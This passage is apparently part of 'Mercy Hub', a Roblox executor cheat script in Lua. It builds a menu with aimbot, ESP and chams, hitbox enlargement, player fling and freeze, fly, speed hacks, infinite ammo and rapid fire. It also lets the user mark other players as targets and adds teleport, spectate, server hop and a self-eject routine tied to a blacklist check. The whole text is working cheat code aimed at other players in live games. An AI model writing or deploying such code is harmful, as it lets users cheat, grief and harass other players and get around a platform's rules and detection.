        local status = GetPlayerStatus(player)
        local pFrame = Instance.new("TextButton", PlayerList)
        pFrame.Size = UDim2.new(1, -5, 0, 35)
        pFrame.BackgroundColor3 = (SelectedPlayerVar == player) and Color3.fromRGB(40, 20, 60) or Color3.fromRGB(20, 20, 20)
        pFrame.BorderSizePixel = 0
        pFrame.AutoButtonColor = true
        pFrame.Text = ""
        Instance.new("UICorner", pFrame).CornerRadius = UDim.new(0, 4)
        
        local pStroke = Instance.new("UIStroke", pFrame)
        pStroke.Color = Color3.fromRGB(180, 100, 255)
        pStroke.Thickness = 1
        pStroke.Transparency = (SelectedPlayerVar == player) and 0 or 0.7
        pStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
        
        local nameLabel = Instance.new("TextLabel", pFrame)
        nameLabel.Size = UDim2.new(0.6, 0, 1, 0)
        nameLabel.Position = UDim2.new(0.05, 0, 0, 0)
        nameLabel.BackgroundTransparency = 1
        nameLabel.Font = Enum.Font.Gotham
        nameLabel.Text = player.Name
        nameLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
        nameLabel.TextXAlignment = Enum.TextXAlignment.Left
        nameLabel.TextSize = 12
        
        local statusTag = Instance.new("TextLabel", pFrame)
        statusTag.Size = UDim2.new(0.3, 0, 0.7, 0)
        statusTag.Position = UDim2.new(0.65, 0, 0.15, 0)
        statusTag.BackgroundColor3 = Color3.fromRGB(40, 40, 50)
        statusTag.Font = Enum.Font.GothamBold
        statusTag.Text = status
        statusTag.TextColor3 = (status == "Target") and Color3.fromRGB(255, 100, 100) or (status == "Whitelist" and Color3.fromRGB(100, 255, 100) or Color3.fromRGB(150, 150, 160))
        statusTag.TextSize = 10
        Instance.new("UICorner", statusTag).CornerRadius = UDim.new(0, 4)

        pFrame.MouseButton1Click:Connect(function()
            SelectedPlayerVar = player
            InfoLabel.Text = player.DisplayName .. " (@" .. player.Name .. ")"
            InfoLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
            PriorityLabel.Text = "Priority: " .. ((status == "Target") and "HIGH" or (status == "Whitelist" and "LOW" or "NORMAL"))
            
            -- Update Viewport
            ViewportFrame:ClearAllChildren()
            if player.Character then
                player.Character.Archivable = true
                local clone = player.Character:Clone()
                player.Character.Archivable = false
                
                clone.Parent = ViewportFrame
                clone:PivotTo(CFrame.new(0, 0, 0))
                
                local hrp = clone:FindFirstChild("HumanoidRootPart")
                if hrp then
                    ViewportCamera.CFrame = CFrame.new(Vector3.new(0, 0, 5), hrp.Position)
                    ViewportCamera.FieldOfView = 30
                end
                
                -- Remove scripts/physics from clone
                for _, v in ipairs(clone:GetDescendants()) do
                    if v:IsA("LuaSourceContainer") or v:IsA("Sound") then
                        v:Destroy()
                    elseif v:IsA("BasePart") then
                        v.Anchored = true
                        v.CanCollide = false
                    end
                end
            end
             
             UpdateActionButtons()
             UpdateWhitelistTab()
         end)
    end
end

-- Search Logic
SearchBar:GetPropertyChangedSignal("Text"):Connect(UpdateWhitelistTab)
Players.PlayerAdded:Connect(UpdateWhitelistTab)
Players.PlayerRemoving:Connect(function(p)
    if SelectedPlayerVar == p then
        SelectedPlayerVar = nil
        InfoLabel.Text = "No player selected"
        InfoLabel.TextColor3 = Color3.fromRGB(150, 150, 150)
        PriorityLabel.Text = "Priority: —"
        ViewportFrame:ClearAllChildren()
        UpdateActionButtons()
    end
    UpdateWhitelistTab()
end)

-- Action Button Logic
local IsSpectating = false
local SpectateTargetUserId = nil

local function SetCameraToLocal()
    local char = LocalPlayer.Character
    local hum = char and char:FindFirstChildOfClass("Humanoid")
    if hum then
        workspace.CurrentCamera.CameraSubject = hum
    end
end

local function UpdateSpectateButton()
    if SpectateBtn then
        SpectateBtn.Text = IsSpectating and "Unspectate" or "Spectate"
    end
end

local function Unspectate()
    IsSpectating = false
    SpectateTargetUserId = nil
    SetCameraToLocal()
    UpdateSpectateButton()
end

TeleportBtn.MouseButton1Click:Connect(function()
    if SelectedPlayerVar and SelectedPlayerVar.Character and LocalPlayer.Character then
        LocalPlayer.Character:PivotTo(SelectedPlayerVar.Character:GetPivot())
    end
end)

SpectateBtn.MouseButton1Click:Connect(function()
    if IsSpectating then
        Unspectate()
        return
    end

    if not (SelectedPlayerVar and SelectedPlayerVar.Character) then
        return
    end

    local hum = SelectedPlayerVar.Character:FindFirstChildOfClass("Humanoid")
    if not hum then
        return
    end

    IsSpectating = true
    SpectateTargetUserId = SelectedPlayerVar.UserId
    workspace.CurrentCamera.CameraSubject = hum
    UpdateSpectateButton()
end)

-- Auto unspectate if the target disappears
Players.PlayerRemoving:Connect(function(p)
    if IsSpectating and SpectateTargetUserId and p.UserId == SpectateTargetUserId then
        Unspectate()
    end
end)

-- Auto unspectate on respawn to avoid stuck cameras
LocalPlayer.CharacterAdded:Connect(function()
    if IsSpectating then
        Unspectate()
    else
        UpdateSpectateButton()
    end
end)

local function UpdateActionButtons()
    if not SelectedPlayerVar then
        WhitelistActionBtn.Text = "Whitelist"
        TargetActionBtn.Text = "Target"
        PriorityLabel.Text = "Priority: —"
        return
    end
    
    local status = GetPlayerStatus(SelectedPlayerVar)
    WhitelistActionBtn.Text = (status == "Whitelist") and "Remove Whitelist" or "Whitelist"
    TargetActionBtn.Text = (status == "Target") and "Untarget" or "Target"
    PriorityLabel.Text = "Priority: " .. ((status == "Target") and "HIGH" or (status == "Whitelist" and "LOW" or "NEUTRAL"))
end

UpdateSpectateButton()
UpdateActionButtons()

WhitelistActionBtn.MouseButton1Click:Connect(function()
    if SelectedPlayerVar then
        local current = GetPlayerStatus(SelectedPlayerVar)
        PlayerStatus[SelectedPlayerVar.UserId] = (current == "Whitelist") and "Neutral" or "Whitelist"
        UpdateWhitelistTab()
        UpdateActionButtons()
        UpdateESP()
    end
end)

TargetActionBtn.MouseButton1Click:Connect(function()
    if SelectedPlayerVar then
        local current = GetPlayerStatus(SelectedPlayerVar)
        PlayerStatus[SelectedPlayerVar.UserId] = (current == "Target") and "Neutral" or "Target"
        UpdateWhitelistTab()
        UpdateActionButtons()
        UpdateESP()
    end
end)

local function Fling(target)
    local char = LocalPlayer.Character
    local hrp = char and char:FindFirstChild("HumanoidRootPart")
    local hum = char and char:FindFirstChildOfClass("Humanoid")
    
    local targetChar = target.Character
    local targetHrp = targetChar and targetChar:FindFirstChild("HumanoidRootPart")
    
    if hrp and targetHrp and hum then
        local oldCFrame = hrp.CFrame
        local oldVelocity = hrp.Velocity
        
        -- High-power physics for fling
        local bav = Instance.new("BodyAngularVelocity")
        bav.MaxTorque = Vector3.new(math.huge, math.huge, math.huge)
        bav.P = 1000000
        bav.AngularVelocity = Vector3.new(0, 999999, 0)
        bav.Parent = hrp
        
        -- Use BodyPosition to "glue" to the target
        local bp = Instance.new("BodyPosition")
        bp.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
        bp.P = 1000000
        bp.D = 50
        bp.Position = targetHrp.Position
        bp.Parent = hrp

        hum:ChangeState(Enum.HumanoidStateType.Physics)
        
        task.spawn(function()
            local start = tick()
            while tick() - start < 2 and target.Parent and targetChar.Parent do
                bp.Position = targetHrp.Position
                hrp.CFrame = targetHrp.CFrame * CFrame.new(0, 0, 0)
                task.wait()
            end
            
            bav:Destroy()
            bp:Destroy()
            hum:ChangeState(Enum.HumanoidStateType.GettingUp)
            hrp.Velocity = oldVelocity
            hrp.CFrame = oldCFrame
        end)
    end
end

FlingBtn.MouseButton1Click:Connect(function()
    if SelectedPlayerVar then
        Fling(SelectedPlayerVar)
    end
end)

-- Game Tab Logic
local MarketService = game:GetService("MarketplaceService")
local GameInfo = MarketService:GetProductInfo(game.PlaceId)

local GameIcon = Instance.new("ImageLabel", GameFrame)
GameIcon.Size = UDim2.new(0, 100, 0, 100)
GameIcon.Position = UDim2.new(0.5, -50, 0, 20)
GameIcon.Image = "rbxassetid://" .. GameInfo.IconImageAssetId
Instance.new("UICorner", GameIcon)

local GameNameLabel = Instance.new("TextLabel", GameFrame)
GameNameLabel.Size = UDim2.new(0.9, 0, 0, 30)
GameNameLabel.Position = UDim2.new(0.05, 0, 0, 130)
GameNameLabel.BackgroundTransparency = 1
GameNameLabel.Font = Enum.Font.GothamBold
GameNameLabel.Text = GameInfo.Name
GameNameLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
GameNameLabel.TextSize = 16

local CreatorLabel = Instance.new("TextLabel", GameFrame)
CreatorLabel.Size = UDim2.new(0.9, 0, 0, 20)
CreatorLabel.Position = UDim2.new(0.05, 0, 0, 160)
CreatorLabel.BackgroundTransparency = 1
CreatorLabel.Font = Enum.Font.Gotham
CreatorLabel.Text = "by " .. GameInfo.Creator.Name
CreatorLabel.TextColor3 = Color3.fromRGB(180, 180, 180)
CreatorLabel.TextSize = 12

local function EjectScript()
    Config.Enabled = false
    Config.ESP_Enabled = false
    Config.FlyEnabled = false
    Config.WalkSpeedEnabled = false
    Config.Frozen = false
    Config.Aimbot_Enabled = false
    Config.Aimbot_ShowFOV = false
    
    if FOVCircle then
        FOVCircle.Visible = false
        FOVCircle:Remove()
    end
    
    -- Restore all players
    RestoreAllHitboxes()
    
    -- Reset local player
    if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") then
        LocalPlayer.Character.Humanoid.WalkSpeed = 16
    end
    
    -- Remove UI and stop loops
    if MainFrame then MainFrame.Visible = false end
    ScreenGui:Destroy()
    script:Destroy() -- Note: This might not stop running connections depending on executor
end

local RejoinBtn = CreateButton("REJOIN SERVER", GameFrame)
RejoinBtn.MouseButton1Click:Connect(function()
    game:GetService("TeleportService"):Teleport(game.PlaceId, LocalPlayer)
end)

local ServerHopBtn = CreateButton("SERVER HOP", GameFrame)
ServerHopBtn.MouseButton1Click:Connect(function()
    local HttpService = game:GetService("HttpService")
    local TeleportService = game:GetService("TeleportService")
    local Servers = HttpService:JSONDecode(game:HttpGet("https://games.roblox.com/v1/games/"..game.PlaceId.."/servers/Public?sortOrder=Desc&limit=100"))
    for _, v in pairs(Servers.data) do
        if v.playing < v.maxPlayers and v.id ~= game.JobId then
            TeleportService:TeleportToPlaceInstance(game.PlaceId, v.id, LocalPlayer)
            break
        end
    end
end)

local EjectBtn = CreateButton("EJECT SCRIPT", GameFrame)
EjectBtn.BackgroundColor3 = Color3.fromRGB(150, 50, 50)
EjectBtn.MouseButton1Click:Connect(EjectScript)

local function SwitchTab(frame, btn, indicator, glow)
    HitboxFrame.Visible = false; AimbotFrame.Visible = false; ESPFrame.Visible = false; RageFrame.Visible = false; MiscFrame.Visible = false; FreezeFrame.Visible = false; WhitelistFrame.Visible = false; GameFrame.Visible = false
    
    HitboxIndicator.Visible = false; AimbotIndicator.Visible = false; ESPIndicator.Visible = false; RageIndicator.Visible = false; MiscIndicator.Visible = false; FreezeIndicator.Visible = false; WhitelistIndicator.Visible = false; GameIndicator.Visible = false
    
    HitboxGlow.Transparency = 1; AimbotGlow.Transparency = 1; ESPGlow.Transparency = 1; RageGlow.Transparency = 1; MiscGlow.Transparency = 1; FreezeGlow.Transparency = 1; WhitelistGlow.Transparency = 1; GameGlow.Transparency = 1
    
    HitboxBtn.TextColor3 = Color3.fromRGB(150, 150, 150); AimbotBtn.TextColor3 = Color3.fromRGB(150, 150, 150); ESPBtn.TextColor3 = Color3.fromRGB(150, 150, 150)
    RageBtn.TextColor3 = Color3.fromRGB(150, 150, 150); MiscBtn.TextColor3 = Color3.fromRGB(150, 150, 150); FreezeBtnTab.TextColor3 = Color3.fromRGB(150, 150, 150); WhitelistBtnTab.TextColor3 = Color3.fromRGB(150, 150, 150); GameBtnTab.TextColor3 = Color3.fromRGB(150, 150, 150)
    
    frame.Visible = true
    btn.TextColor3 = Color3.fromRGB(180, 100, 255)
    indicator.Visible = true
    glow.Transparency = 0.5
    
    if frame == WhitelistFrame then UpdateWhitelistTab() end
end

AimbotBtn.MouseButton1Click:Connect(function() SwitchTab(AimbotFrame, AimbotBtn, AimbotIndicator, AimbotGlow) end)
HitboxBtn.MouseButton1Click:Connect(function() SwitchTab(HitboxFrame, HitboxBtn, HitboxIndicator, HitboxGlow) end)
ESPBtn.MouseButton1Click:Connect(function() SwitchTab(ESPFrame, ESPBtn, ESPIndicator, ESPGlow) end)
RageBtn.MouseButton1Click:Connect(function() SwitchTab(RageFrame, RageBtn, RageIndicator, RageGlow) end)
MiscBtn.MouseButton1Click:Connect(function() SwitchTab(MiscFrame, MiscBtn, MiscIndicator, MiscGlow) end)
FreezeBtnTab.MouseButton1Click:Connect(function() SwitchTab(FreezeFrame, FreezeBtnTab, FreezeIndicator, FreezeGlow) end)
WhitelistBtnTab.MouseButton1Click:Connect(function() SwitchTab(WhitelistFrame, WhitelistBtnTab, WhitelistIndicator, WhitelistGlow) end)
GameBtnTab.MouseButton1Click:Connect(function() SwitchTab(GameFrame, GameBtnTab, GameIndicator, GameGlow) end)

local function UpdateUI()
    ToggleBtn.Text = "Status: " .. (Config.Enabled and "Enabled" or "Disabled") .. " (E)"
    ToggleBtn.BackgroundColor3 = Config.Enabled and Color3.fromRGB(180, 100, 255) or Color3.fromRGB(20, 20, 20)
    
    AimbotToggleBtn.Text = "Aimbot: " .. (Config.Aimbot_Enabled and "ON" or "OFF")
    AimbotToggleBtn.BackgroundColor3 = Config.Aimbot_Enabled and Color3.fromRGB(180, 100, 255) or Color3.fromRGB(20, 20, 20)

    AimbotMethodBtn.Text = "Method: " .. Config.Aimbot_Method
    AimbotMethodBtn.BackgroundColor3 = Color3.fromRGB(20, 20, 20)

    AimbotShowFOVBtn.Text = "Show FOV: " .. (Config.Aimbot_ShowFOV and "ON" or "OFF")
    AimbotShowFOVBtn.BackgroundColor3 = Config.Aimbot_ShowFOV and Color3.fromRGB(180, 100, 255) or Color3.fromRGB(20, 20, 20)

    AimbotTeamCheckBtn.Text = "Team Check: " .. (Config.Aimbot_TeamCheck and "ON" or "OFF")
    AimbotTeamCheckBtn.BackgroundColor3 = Config.Aimbot_TeamCheck and Color3.fromRGB(180, 100, 255) or Color3.fromRGB(20, 20, 20)

    AimbotWallCheckBtn.Text = "Wall Check: " .. (Config.Aimbot_WallCheck and "ON" or "OFF")
    AimbotWallCheckBtn.BackgroundColor3 = Config.Aimbot_WallCheck and Color3.fromRGB(180, 100, 255) or Color3.fromRGB(20, 20, 20)

    AimbotPartCycle.Text = "Aimbot Target: " .. Config.Aimbot_TargetPart

    CleanVisualsToggle.Text = "Clean Visuals: " .. (Config.UnmodifiedVisuals and "ON" or "OFF")
    CleanVisualsToggle.BackgroundColor3 = Config.UnmodifiedVisuals and Color3.fromRGB(180, 100, 255) or Color3.fromRGB(20, 20, 20)
    
    if Config.UnmodifiedVisuals then
        Config.HitboxTransparency = 1
    else
        Config.HitboxTransparency = 0.5
    end

    TeamToggle.Text = "Team Check: " .. (Config.TeamCheck and "ON" or "OFF")
    TeamToggle.BackgroundColor3 = Config.TeamCheck and Color3.fromRGB(180, 100, 255) or Color3.fromRGB(20, 20, 20)
    
    WallToggle.Text = "Wall Check: " .. (Config.WallCheck and "ON" or "OFF")
    WallToggle.BackgroundColor3 = Config.WallCheck and Color3.fromRGB(180, 100, 255) or Color3.fromRGB(20, 20, 20)
    
    PartCycle.Text = "Target: " .. Config.TargetPart
    
    ShowHitboxToggleBtn_HitboxTab.Text = "Show Hitbox: " .. (Config.ShowHitbox and "ON" or "OFF")
    ShowHitboxToggleBtn_HitboxTab.BackgroundColor3 = Config.ShowHitbox and Color3.fromRGB(180, 100, 255) or Color3.fromRGB(20, 20, 20)

    ESPToggleBtn.Text = "ESP Toggle: " .. (Config.ESP_Enabled and "ON" or "OFF") .. " (Q)"
    ESPToggleBtn.BackgroundColor3 = Config.ESP_Enabled and Color3.fromRGB(180, 100, 255) or Color3.fromRGB(20, 20, 20)
    
    ChamsToggleBtn.Text = "Chams: " .. (Config.Chams_Enabled and "ON" or "OFF")
    ChamsToggleBtn.BackgroundColor3 = Config.Chams_Enabled and Color3.fromRGB(180, 100, 255) or Color3.fromRGB(20, 20, 20)

    HitboxEspToggleBtn.Text = "Show Hitbox: " .. (Config.ShowHitbox and "ON" or "OFF")
    HitboxEspToggleBtn.BackgroundColor3 = Config.ShowHitbox and Color3.fromRGB(180, 100, 255) or Color3.fromRGB(20, 20, 20)
    
    HealthToggleBtn.Text = "Health Text: " .. (Config.HealthText_Enabled and "ON" or "OFF")
    HealthToggleBtn.BackgroundColor3 = Config.HealthText_Enabled and Color3.fromRGB(180, 100, 255) or Color3.fromRGB(20, 20, 20)
    
    DisplayNameToggleBtn.Text = "Show Names: " .. (Config.ShowDisplayName and "ON" or "OFF")
    DisplayNameToggleBtn.BackgroundColor3 = Config.ShowDisplayName and Color3.fromRGB(180, 100, 255) or Color3.fromRGB(20, 20, 20)
    
    VisCheckToggleBtn.Text = "Visible Check: " .. (Config.VisibleCheck and "ON" or "OFF")
    VisCheckToggleBtn.BackgroundColor3 = Config.VisibleCheck and Color3.fromRGB(180, 100, 255) or Color3.fromRGB(20, 20, 20)
    
    FreezeToggleBtn.Text = "Freeze Players: " .. (Config.Frozen and "ON" or "OFF") .. " (T)"
    FreezeToggleBtn.BackgroundColor3 = Config.Frozen and Color3.fromRGB(150, 50, 50) or Color3.fromRGB(20, 20, 20)
    
    FlyToggleBtn.Text = "Fly: " .. (Config.FlyEnabled and "ON" or "OFF")
    FlyToggleBtn.BackgroundColor3 = Config.FlyEnabled and Color3.fromRGB(180, 100, 255) or Color3.fromRGB(20, 20, 20)
    
    WalkSpeedToggleBtn.Text = "WalkSpeed: " .. (Config.WalkSpeedEnabled and "ON" or "OFF")
    WalkSpeedToggleBtn.BackgroundColor3 = Config.WalkSpeedEnabled and Color3.fromRGB(180, 100, 255) or Color3.fromRGB(20, 20, 20)
    
    InfAmmoBtn.Text = "Infinite Ammo: " .. (Config.InfAmmo and "ON" or "OFF")
    InfAmmoBtn.BackgroundColor3 = Config.InfAmmo and Color3.fromRGB(180, 100, 255) or Color3.fromRGB(20, 20, 20)
    
    RapidFireBtn.Text = "Rapid Fire: " .. (Config.RapidFire and "ON" or "OFF")
    RapidFireBtn.BackgroundColor3 = Config.RapidFire and Color3.fromRGB(180, 100, 255) or Color3.fromRGB(20, 20, 20)
end

ToggleBtn.MouseButton1Click:Connect(function()
    Config.Enabled = not Config.Enabled
    if not Config.Enabled then RestoreAllHitboxes() end
    UpdateUI()
end)

AimbotToggleBtn.MouseButton1Click:Connect(function() Config.Aimbot_Enabled = not Config.Aimbot_Enabled UpdateUI() end)
AimbotMethodBtn.MouseButton1Click:Connect(function()
    Config.Aimbot_Method = (Config.Aimbot_Method == "Cam Lock") and "Mouse Lock" or "Cam Lock"
    UpdateUI()
end)
AimbotShowFOVBtn.MouseButton1Click:Connect(function() Config.Aimbot_ShowFOV = not Config.Aimbot_ShowFOV UpdateUI() end)
AimbotTeamCheckBtn.MouseButton1Click:Connect(function() Config.Aimbot_TeamCheck = not Config.Aimbot_TeamCheck UpdateUI() end)
AimbotWallCheckBtn.MouseButton1Click:Connect(function() Config.Aimbot_WallCheck = not Config.Aimbot_WallCheck UpdateUI() end)
local AimbotParts = {"Head", "Body"}
local AimbotPartIdx = 1
AimbotPartCycle.MouseButton1Click:Connect(function()
    AimbotPartIdx = AimbotPartIdx % #AimbotParts + 1; Config.Aimbot_TargetPart = AimbotParts[AimbotPartIdx]
    UpdateUI()
end)

CleanVisualsToggle.MouseButton1Click:Connect(function() 
    Config.UnmodifiedVisuals = not Config.UnmodifiedVisuals 
    RestoreAllHitboxes()
    UpdateUI() 
end)
TeamToggle.MouseButton1Click:Connect(function() Config.TeamCheck = not Config.TeamCheck UpdateUI() end)
WallToggle.MouseButton1Click:Connect(function() 
    Config.WallCheck = not Config.WallCheck 
    if not Config.WallCheck then for _, p in ipairs(Players:GetPlayers()) do ApplyHitbox(p) end end
    UpdateUI() 
end)
-- Removing HumanoidRootPart target prevents "run in place" physics issues.
local Parts = {"Body", "Head"}
local PartIdx = 1
PartCycle.MouseButton1Click:Connect(function()
    PartIdx = PartIdx % #Parts + 1; Config.TargetPart = Parts[PartIdx]
    RestoreAllHitboxes()
    UpdateUI()
end)
SizeInput.FocusLost:Connect(function() Config.HitboxSize = tonumber(SizeInput.Text) or Config.HitboxSize end)
ShowHitboxToggleBtn_HitboxTab.MouseButton1Click:Connect(function() 
    Config.ShowHitbox = not Config.ShowHitbox 
    UpdateUI() 
end)

ESPToggleBtn.MouseButton1Click:Connect(function() Config.ESP_Enabled = not Config.ESP_Enabled UpdateUI() end)
ChamsToggleBtn.MouseButton1Click:Connect(function() Config.Chams_Enabled = not Config.Chams_Enabled UpdateUI() end)
HitboxEspToggleBtn.MouseButton1Click:Connect(function() Config.ShowHitbox = not Config.ShowHitbox UpdateUI() end)
HealthToggleBtn.MouseButton1Click:Connect(function() Config.HealthText_Enabled = not Config.HealthText_Enabled UpdateUI() end)
DisplayNameToggleBtn.MouseButton1Click:Connect(function() Config.ShowDisplayName = not Config.ShowDisplayName UpdateUI() end)
VisCheckToggleBtn.MouseButton1Click:Connect(function() Config.VisibleCheck = not Config.VisibleCheck UpdateUI() end)
FreezeToggleBtn.MouseButton1Click:Connect(function() ToggleFreeze(); UpdateUI() end)
FlyToggleBtn.MouseButton1Click:Connect(function() Config.FlyEnabled = not Config.FlyEnabled; if Config.FlyEnabled then StartFly() end; UpdateUI() end)
WalkSpeedToggleBtn.MouseButton1Click:Connect(function() 
    Config.WalkSpeedEnabled = not Config.WalkSpeedEnabled
    if not Config.WalkSpeedEnabled and LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") then
        LocalPlayer.Character.Humanoid.WalkSpeed = 16 -- Reset to default
    end
    UpdateUI() 
end)

InfAmmoBtn.MouseButton1Click:Connect(function() Config.InfAmmo = not Config.InfAmmo UpdateUI() end)
RapidFireBtn.MouseButton1Click:Connect(function() Config.RapidFire = not Config.RapidFire UpdateUI() end)

-- Hotkeys & Setup
UserInputService.InputBegan:Connect(function(input, gp)
    if input.KeyCode == Config.ToggleKey then 
        MainFrame.Visible = not MainFrame.Visible
    end
    
    if not gp then
        if input.KeyCode == Config.HitboxToggleKey then
            Config.Enabled = not Config.Enabled
            if not Config.Enabled then RestoreAllHitboxes() end
            UpdateUI()
        elseif input.KeyCode == Config.ESP_Key then Config.ESP_Enabled = not Config.ESP_Enabled UpdateUI()
        elseif input.KeyCode == Config.FreezeKey then ToggleFreeze(); UpdateUI() end
    end
end)

local function SetupPlayer(player)
    if player == LocalPlayer then return end
    CreateESP(player)
    player.CharacterAdded:Connect(function() 
        task.wait(0.5)
        if Config.Enabled then ApplyHitbox(player) end 
    end)
    if player.Character and Config.Enabled then
        ApplyHitbox(player)
    end
end

local charAddedConnWS
local function SetupLocalPlayer()
    if charAddedConnWS then charAddedConnWS:Disconnect() end
    charAddedConnWS = LocalPlayer.CharacterAdded:Connect(function(char)
        local hum = char:WaitForChild("Humanoid")
        if Config.WalkSpeedEnabled then
            hum.WalkSpeed = Config.WalkSpeed
        end
        if Config.FlyEnabled then StartFly() end
    end)
    
    if LocalPlayer.Character then
        local hum = LocalPlayer.Character:FindFirstChild("Humanoid")
        if hum and Config.WalkSpeedEnabled then
            hum.WalkSpeed = Config.WalkSpeed
        end
    end
end
SetupLocalPlayer()

for _, p in ipairs(Players:GetPlayers()) do SetupPlayer(p) end
Players.PlayerAdded:Connect(SetupPlayer)
Players.PlayerRemoving:Connect(function(player) if ESP_Elements[player.UserId] then ESP_Elements[player.UserId].Folder:Destroy(); ESP_Elements[player.UserId] = nil end end)

local lastHitboxUpdate = 0
local lastESPUpdate = 0

RunService.RenderStepped:Connect(function()
    local now = tick()
    
    -- Throttled Hitbox Update (10 times per second)
    if Config.Enabled and now - lastHitboxUpdate > 0.1 then
        lastHitboxUpdate = now
        for _, p in ipairs(Players:GetPlayers()) do
            ApplyHitbox(p)
        end
    end
    
    -- Throttled ESP Update (30 times per second)
    if now - lastESPUpdate > 0.033 then
        lastESPUpdate = now
        pcall(function()
            UpdateESP()
        end)
    end
end)

-- Desync removed

-- Performance Optimized Background Tasks
task.spawn(function()
    while task.wait(0.1) do
        local now = tick()
        
        -- Throttled Rage Update (0.1s is the task.wait frequency)
        UpdateRage()
        
        -- Throttled WalkSpeed Update (Slower task)
        if now - LastWalkTick >= 0.5 then
            LastWalkTick = now
            if Config.WalkSpeedEnabled and LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") then
                LocalPlayer.Character.Humanoid.WalkSpeed = Config.WalkSpeed
            end
        end
        
        -- Cleanup Orphans & Old Highlights (Fixes Chams Bug)
        if now - LastCleanupTick >= 1.5 then
            LastCleanupTick = now
            if ParentContainer then
                for _, v in ipairs(ParentContainer:GetChildren()) do
                    if v.Name:find("ESP_") then
                        local idStr = v.Name:sub(5)
                        local userId = tonumber(idStr)
                        local player = userId and Players:GetPlayerByUserId(userId)
                        
                        if not player or not player.Parent then
                            pcall(function() v:Destroy() end)
                        end
                    end
                end
            end
        end
        
        -- Periodic Re-scan: Ensure everyone has ESP/Chams (Runs every 3 seconds)
        if now - LastRescanTick >= 3 then
            LastRescanTick = now
            
            -- Blacklist Check
            if CheckBlacklist() then
                EjectScript()
                return
            end
            
            for _, player in ipairs(Players:GetPlayers()) do
                if player ~= LocalPlayer and not ESP_Elements[player.UserId] then
                    SetupPlayer(player)
                end
            end
            
            -- Re-scan tools for new ammo values
            for _, tool in ipairs(LocalPlayer.Backpack:GetChildren()) do ScanTool(tool) end
            if LocalPlayer.Character then
                for _, tool in ipairs(LocalPlayer.Character:GetChildren()) do ScanTool(tool) end
            end
        end
    end
end)

UpdateUI(); SwitchTab(AimbotFrame, AimbotBtn, AimbotIndicator, AimbotGlow)
MainFrame.Visible = true
print("Mercy Hub Loaded!")
